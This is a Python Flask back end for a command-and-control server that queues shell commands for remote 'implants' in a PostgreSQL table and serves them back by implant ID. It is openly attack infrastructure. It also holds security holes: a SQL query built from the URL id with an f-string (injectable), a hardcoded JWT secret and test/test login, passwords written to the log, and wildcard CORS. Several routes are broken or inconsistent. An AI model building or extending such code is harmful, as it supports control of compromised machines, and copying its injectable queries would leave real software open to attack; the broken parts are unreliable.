# The C2 Server

import os
from datetime import datetime

from decouple import config
from flask import (Flask, jsonify, make_response, redirect, render_template,
                   request, url_for)
from flask_cors import CORS, cross_origin
from flask_jwt_extended import (JWTManager, create_access_token, get_jwt,
                                get_jwt_identity, jwt_required,
                                unset_jwt_cookies)
from psycopg2 import connect, sql

app = Flask(__name__)
CORS(app)

host = config('host')
password = config('password')
username = config('username')
port = config('thePort')
database = config('database')

# Code taken from https://dev.to/nagatodev/how-to-add-login-authentication-to-a-flask-and-react-application-23i7
app.config["JWT_SECRET_KEY"] = "change-me"
app.config['CORS_HEADERS'] = 'Content-Type'
jwt = JWTManager(app)


@app.route('/logout', methods=["POST"])
def logout():
    response = jsonify({"msg": "logout success"})
    unset_jwt_cookies(response)
    return response

@app.route('/login', methods=["POST"])
def create_token():
    access_token = ""
    try:
        data = request.form
        username = data["username"]
        password = data["password"]
        print(username)
        print(password)
        if username != "test" or password != "test":  # hardcoded login, TODO compare to database
            return {"msg": "Wrong email or password"}, 401, {'Access-Control-Allow-Origin': '*'}

        access_token = create_access_token(identity=username)
        print(f"success logging in: {access_token}")
        return ({'access_token': access_token}, 200, {'Access-Control-Allow-Origin': '*'})
    except Exception as error:
        print(f"error logging in: {error}")
        return {'failure': 'failure'}, 500, {'Access-Control-Allow-Origin': '*'}

# Loads connection to postgresql database


def load():
    # Connect to C2
    try:
        print("Connecting")
        conn = connect(dbname=database, user=username,
                       password=password, host=host, port=port, connect_timeout=20)
        print("Success? Should be 0 -> ", conn.closed)
        cursor = conn.cursor()
    except:
        print("failed to connect")

    print(f"Connection closed? {conn.closed}")
    return conn, cursor


# Executes an insert query
def executeInsertQuery(query, variables):
    error = None
    try:
        conn, cursor = load()
        print()
        print("executing: ")
        print(query.as_string(cursor), variables)
        print()
        cursor.execute(query, variables)
        conn.commit()
        cursor.close()
        conn.close()
    except Exception as error:
        error = error
    finally:
        if (error):
            return error
        else:
            return None

# Executes a select query


def executeSelectQuery(query, variables):
    conn, cursor = load()
    print()
    print("executing: ")
    print(query.as_string(cursor), variables)
    print()
    cursor.execute(query, variables)
    conn.commit()
    returnThis = cursor.fetchall()
    cursor.close()
    conn.close()

    return returnThis


@app.route("/test", methods=["GET"])
def handle_test():
    stuff = executeInsertQuery("SELECT * from command_queue")
    return jsonify(stuff)


@app.route("/")
def home():
    pass

# Builds a insert query, give table name and name of columns


def insertQueryBuilder(tableName, columns):

    q = sql.SQL("INSERT INTO {table}({column}) VALUES ({value})").format(
        table=sql.Identifier(tableName),
        column=sql.SQL(',').join([
            sql.Identifier(x) for x in columns
        ]),
        value=sql.SQL(',').join(sql.Placeholder() * len(columns))
    )

    return q

# api endpoint to queue a command


@app.route("/queueCommand", methods=["POST"])
def handle_execute():
    try:
        target_implant_id = int(request.form.get('target_implant_id'))
        command = request.form.get('command')
        created_on = datetime.now().isoformat()
        status = "untouched"

        columns = ['target_implant_id', 'command', 'created_on', 'status']

        data = target_implant_id, command, created_on, status

        query = insertQueryBuilder("task_queue", columns)
        print(f"data: {data}")
        failure = executeInsertQuery(query, data)
        if (failure != None):
            print(failure)
            return "Failure executing query", 400, {'Access-Control-Allow-Origin': '*'}

        response = app.response_class(
            response="Success!",
            status=200,
            mimetype="application/json"
        )
        response.headers['Acess-Control-Allow-Origin'] = '*'
        return response
    except Exception as error:
        print(f"Failure sending commands: {error}")
        response = app.response_class(
            response=f"Failure! {error}",
            status=400,
            mimetype="application/json"
        )
        response.headers['Acess-Control-Allow-Origin'] = '*'
        return response

# List all commands for a particular implant


@app.route("/getCommands/<id>", methods=["GET"])
def get_commands(id):
    success = None
    try:
        data = executeSelectQuery(
            f"SELECT command FROM task_queue WHERE implant_id={id}")
    except Exception as error:
        print("failed to retrieve data")
        print(error)
        success = False
        return "<div>Failure</div>"
    finally:
        success = True
    if (success):
        print(data)
        return f"<div>success: {data}</div>"
    else:
        return "<div>Failure</div>"

# for testing


def main():
    target_implant_id = 1
    command = 'some long command'
    created_on = '2022-12-01T16:41:10.592868'
    status = 'untouched'
    data = [target_implant_id, command, created_on, status]
    columns = ['target_implant_id', 'command', 'created_on', 'status']

    query = insertQueryBuilder('task_queue', columns)
    results = executeInsertQuery(query, data)

    print(results)


if __name__ == "__main__":
    main()
